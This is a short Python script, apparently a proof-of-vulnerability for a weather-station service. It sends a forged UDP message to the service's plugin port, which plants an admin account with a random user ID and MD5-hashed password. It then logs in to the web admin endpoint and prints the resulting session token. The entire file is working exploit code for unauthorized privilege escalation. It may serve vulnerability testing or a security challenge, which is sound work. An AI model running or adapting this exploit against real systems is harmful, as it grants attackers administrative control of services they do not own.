#!/bin/python3

import requests
from datetime import datetime as dt
import socket
import hashlib
import json
import time
import os

import random


# The tempest weather plugin listing on port 50222
server = os.getenv('HOST', '127.0.0.1')
weather_port = int(os.getenv('WEATHER_PORT', '50222'))

# The main web server port
http_port = int(os.getenv('HTTP_PORT', '8080'))

# for doing things that require authentication
admin_session = requests.Session()


userid = 'pov' + str(random.randint(0, 1000000))
password = b'pov' + bytes(str(random.randint(0, 1000000)), 'utf8')

password_hash = hashlib.md5(password)


# timestamp field needs to be there to pass validation, but the value doesn't matter
admin_template = { 
                    "timestamp": 11111111,
                    "type":"admindatas",
                    "userid": userid,
                    "password": password_hash.hexdigest()
                    }


clientSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


addr = (server, weather_port)


clientSocket.sendto(json.dumps(admin_template).encode(), addr)

# janky, but need time for the message to get processed and added to the database
time.sleep(1)

# now attempt to login with the user and password that should have been created
result = admin_session.post('http://{}:{}/admin/login'.format(server, http_port), 
                        data={'userid':userid, 'password': password})


print(result.status_code, result.text)
result_j = json.loads(result.text)

if "login successful" == result_j['message']:
    print("TOKEN=" + result_j['token'])
    print("Success!");


else:

    print("Something went wrong with the pov")

